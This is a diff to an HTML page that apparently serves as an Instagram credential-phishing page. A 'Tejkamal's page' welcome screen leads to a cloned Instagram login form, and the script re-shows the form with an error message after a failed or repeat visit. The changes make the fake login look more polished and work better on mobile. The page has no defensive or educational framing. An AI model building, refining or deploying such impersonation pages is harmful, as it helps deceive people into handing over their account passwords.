@@ -4,40 +4,45 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Instagram</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;600&display=swap" rel="stylesheet">
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-      background: linear-gradient(135deg, #fdfbfb 0%, #ebedee 100%);
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(to top left, #fdfbfb, #ebedee);
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
       margin: 0;
       flex-direction: column;
+      padding: 10px;
     }
 
-    /* Fancy Welcome Screen */
+    /* Welcome Screen */
     #welcome-screen {
       background: white;
       border-radius: 16px;
-      padding: 40px 30px;
+      padding: 40px 25px;
       box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
       text-align: center;
       animation: fadeIn 1.2s ease-in-out;
       max-width: 400px;
-      width: 90%;
+      width: 100%;
     }
 
     #welcome-screen h2 {
-      font-size: 26px;
+      font-size: 22px;
       margin-bottom: 20px;
       color: #262626;
-      animation: fadeIn 1.6s ease-in-out;
     }
 
     #welcome-screen button {
-      padding: 12px 24px;
-      background: linear-gradient(135deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+      padding: 12px 20px;
+      background: linear-gradient(135deg, #405de6, #833ab4, #e1306c, #fd1d1d);
       background-size: 300% 300%;
       color: white;
       border: none;
@@ -60,12 +65,13 @@
     }
 
     .login-container {
-      width: 350px;
+      width: 100%;
+      max-width: 350px;
       text-align: center;
     }
 
     .title {
-      font-size: 38px;
+      font-size: 32px;
       font-weight: bold;
       color: #262626;
       margin: 20px 0 30px;
@@ -73,56 +79,72 @@
     }
 
     .login-box {
-      background-color: #fff;
-      border: 1px solid #dbdbdb;
-      padding: 30px 25px;
-      border-radius: 8px;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      background: #ffffff;
+      border-radius: 15px;
+      padding: 30px 20px;
+      border: 1px solid #e6e6e6;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.07);
+      transition: all 0.3s ease;
     }
 
     .input-group {
       position: relative;
-      margin: 10px 0;
+      margin: 15px 0;
     }
 
-    .login-box input[type="text"],
-    .login-box input[type="password"] {
+    .input-group input {
       width: 100%;
-      padding: 12px 10px;
+      padding: 12px 12px 12px 40px;
       border: 1px solid #dbdbdb;
-      border-radius: 4px;
-      background-color: #fafafa;
+      border-radius: 10px;
+      background-color: #f9f9f9;
       font-size: 14px;
-      box-sizing: border-box;
+      transition: 0.3s;
       outline: none;
     }
 
-    .login-box input[type="text"]:focus,
-    .login-box input[type="password"]:focus {
+    .input-group input:focus {
       border-color: #0095f6;
+      background-color: #fff;
+      box-shadow: 0 0 0 3px rgba(0,149,246,0.2);
+    }
+
+    .input-group::before {
+      content: '👤';
+      position: absolute;
+      left: 12px;
+      top: 12px;
+      font-size: 16px;
+      color: #bbb;
+    }
+
+    .input-group:nth-child(2)::before {
+      content: '🔒';
     }
 
     .login-box input[type="submit"] {
       width: 100%;
-      padding: 8px;
+      padding: 10px;
       margin: 20px 0;
-      background-color: #0095f6;
+      background: linear-gradient(135deg, #3897f0, #007bb5);
       color: #fff;
       border: none;
-      border-radius: 4px;
+      border-radius: 30px;
       font-size: 14px;
       font-weight: 600;
       cursor: pointer;
-      transition: background-color 0.2s;
+      transition: 0.3s;
     }
 
     .login-box input[type="submit"]:hover {
-      background-color: #007bb5;
+      background-position: right center;
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
+      transform: scale(1.02);
     }
 
     .error-message {
       color: #ed4956;
-      font-size: 12px;
+      font-size: 13px;
       margin-top: 10px;
       display: none;
     }
@@ -156,17 +178,36 @@
       text-decoration: none;
       font-weight: 600;
     }
+
+    @media screen and (max-width: 480px) {
+      #welcome-screen,
+      .login-box {
+        padding: 25px 15px;
+      }
+
+      .input-group input {
+        font-size: 13px;
+      }
+
+      .title {
+        font-size: 28px;
+      }
+
+      #welcome-screen h2 {
+        font-size: 20px;
+      }
+    }
   </style>
 </head>
 <body>
 
-  <!-- Fancy Welcome Screen -->
+  <!-- Welcome Screen -->
   <div id="welcome-screen">
     <h2>Hi, welcome to Tejkamal's page 😊</h2>
     <button onclick="startInstagramLogin()">Sign up with Instagram</button>
   </div>
 
-  <!-- Login Form (Initially Hidden) -->
+  <!-- Login Form -->
   <div id="login-section" class="login-container" style="display: none;">
     <div class="title">Instagram</div>
     <div class="login-box">
@@ -202,12 +243,20 @@
 
     window.onload = function () {
       const params = new URLSearchParams(window.location.search);
+      const alreadyVisited = sessionStorage.getItem('visited');
+
+      if (alreadyVisited || params.get("error") === "true") {
+        document.getElementById('welcome-screen').style.display = 'none';
+        document.getElementById('login-section').style.display = 'block';
+      }
+
       if (params.get("error") === "true") {
         document.getElementById("errorMessage").style.display = "block";
       }
     };
 
     function startInstagramLogin() {
+      sessionStorage.setItem('visited', 'true');
       document.getElementById('welcome-screen').style.display = 'none';
       document.getElementById('login-section').style.display = 'block';
     }
